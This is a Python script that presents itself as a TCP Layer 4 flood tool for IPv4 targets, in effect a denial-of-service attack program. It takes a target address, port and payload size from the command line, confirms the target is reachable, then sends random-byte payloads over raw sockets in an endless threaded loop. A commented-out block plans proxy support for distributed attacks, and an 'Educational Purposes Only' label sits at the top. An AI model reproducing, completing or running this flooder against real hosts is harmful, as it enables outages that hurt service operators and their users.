import socket
import sys
from concurrent.futures import Future
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import as_completed
try:
    from random import randbytes
except:
    print("It is required to use python 3.9+ version in order to run this script")
    sys.exit(-1)
# Educational Purposes Only
# Z3NTL3
# TCP Raw Layer 4 Flood for Ipv4's

count = 0
def Usage():
    print(f"""
python3 {__file__} ip port bytes
""")

try:
    websiteHost_or_IP = sys.argv[1]
    portX = int(sys.argv[2])
    bytesX = int(sys.argv[3])
    
except:
    Usage()
    sys.exit(-1)
def CheckValid():
    try:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as socks:
            socks.settimeout(5)
            socks.connect((sys.argv[1],portX))
        return True
    except:
        return False
# Will implement Proxied L4 DDOS Later
''' 
def Proxies(file = sys.argv[3]):
    if os.path.exists(file):
        with open(file,"r")as file:
            content = file.read().strip(" ").split("\n")
        return content
    else:
        print(f"File \'{file}\' does not exist")
        sys.exit(-1)

def FormatCheck():
    proxys = Proxies()
    err = False
    for prox in proxys:
        if ":" not in prox:
            err = True
            break
    if err:
        print("Please format your proxies like ip:port each line and remove all white spaces")
        sys.exit(-1)
'''
def Flooder(**pHu):
    global count
    sVar = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
    try:
        z3Payload = randbytes(bytesX)
        sendByte = sVar.sendto(z3Payload, (pHu['host_ip'],pHu['port']))
        count+=1
        return f"SEND {count} TCP Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
    except:
        return f"TCP Flood Failed On {pHu['host_ip']}:{pHu['port']}"
    finally:
       sVar.close()
    
def Main():
    global count
    pool =  ThreadPoolExecutor(max_workers=61)
    while True:
        f = pool.submit(Flooder,host_ip=websiteHost_or_IP,port=portX)
        print(f.result())
        
if __name__ == "__main__":
    validity = CheckValid()
    if validity == False:
        sys.exit("This ip:port refused the connection")
    Main()
